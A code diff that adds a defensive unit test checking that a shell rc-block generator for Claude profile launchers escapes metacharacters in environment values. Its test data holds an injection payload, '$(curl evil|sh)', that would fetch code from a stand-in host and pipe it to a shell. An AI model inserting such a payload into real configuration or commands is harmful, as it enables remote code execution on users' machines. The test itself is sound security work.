@@ -34,6 +34,21 @@ describe('renderRcBlock', () => {
     expect(block).toContain('$env:CLAUDE_CONFIG_DIR = "$env:USERPROFILE\\.claude-z"')
     expect(block).toContain('claude @args')
   })
+
+  it('escapes shell metacharacters in free-form env values (defense in depth)', () => {
+    const evil: Manifest = {
+      version: 1, hub: null,
+      profiles: [{ name: 'x', dir: '{home}/.claude-x', launcher: 'cl-x', auth: 'env',
+        env: { BASE: 'http://h/$(curl evil|sh)`x`"end' }, links: {}, mcp: [] }],
+      mcpServers: {},
+    }
+    const posix = renderRcBlock(evil, mac)
+    expect(posix).toContain('export BASE="http://h/\\$(curl evil|sh)\\`x\\`\\"end"')
+    expect(posix).not.toContain('"$(curl evil|sh)"') // the dangerous unescaped form must not appear
+    const pwsh = renderRcBlock(evil, win)
+    expect(pwsh).toContain('`$(curl evil|sh)')
+    expect(pwsh).toContain('`"end')
+  })
 })
 
 describe('upsertManagedBlock', () => {
